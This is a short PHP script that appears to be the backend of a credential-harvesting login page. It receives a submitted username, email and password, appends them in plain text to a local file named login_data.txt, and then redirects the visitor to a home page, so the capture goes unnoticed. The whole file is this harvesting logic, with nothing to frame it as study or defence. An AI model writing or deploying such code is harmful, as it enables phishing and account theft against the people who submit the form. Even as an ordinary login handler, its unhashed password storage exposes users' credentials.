<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $email = $_POST['email'];
    $pass = $_POST['pass'];

  
    $file = 'login_data.txt';
    $handle = fopen($file, 'a'); 


    $data = "Username: $username, Email: $email, Password: $pass\n";
    fwrite($handle, $data);

    fclose($handle);

   
    header('Location: home/home.html');
    exit();
}
?>
